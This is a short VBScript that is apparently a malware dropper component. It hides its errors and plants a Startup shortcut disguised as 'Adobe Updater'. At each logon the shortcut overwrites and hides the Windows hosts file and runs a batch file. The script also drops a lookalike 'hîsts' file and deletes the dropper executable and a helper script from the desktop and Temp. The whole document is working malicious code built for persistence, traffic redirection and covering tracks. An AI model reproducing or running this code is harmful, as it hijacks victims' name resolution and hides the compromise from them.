dim filesys
On Error Resume Next
Set filesys = CreateObject("Scripting.FileSystemObject")
set WshShell = WScript.CreateObject("WScript.Shell")
set oShellLink = WshShell.CreateShortcut("C:\Documents and Settings\Erène Full\Start Menu\Programs\Startup\Adobe Updater.lnk")
oShellLink.TargetPath = "C:\WINDOWS\system32\cmd.exe"
oShellLink.Arguments = " /c copy ""C:\DOCUME~1\ERNEFU~1\LOCALS~1\Temp\hlp1"" ""C:\WINDOWS\system32\drivers\etc\hosts"" /Y && attrib +H ""C:\WINDOWS\system32\drivers\etc\hosts"" && ""C:\DOCUME~1\ERNEFU~1\LOCALS~1\Temp\eula.bat"""
oShellLink.IconLocation = "C:\DOCUME~1\ERNEFU~1\LOCALS~1\Temp\1.ico"
oShellLink.WindowStyle = 7
oShellLink.Description = "Shortcut Script"
oShellLink.WorkingDirectory = "C:\WINDOWS\system32"
oShellLink.Save
filesys.CopyFile "C:\DOCUME~1\ERNEFU~1\LOCALS~1\Temp\hlp2","C:\WINDOWS\system32\drivers\etc\hîsts",OverwriteExisting
Wscript.Sleep 3000
filesys.DeleteFile("C:\Documents and Settings\Erène Full\Desktop\16.exe")
filesys.DeleteFile("C:\DOCUME~1\ERNEFU~1\LOCALS~1\Temp\checkexp.vbs")
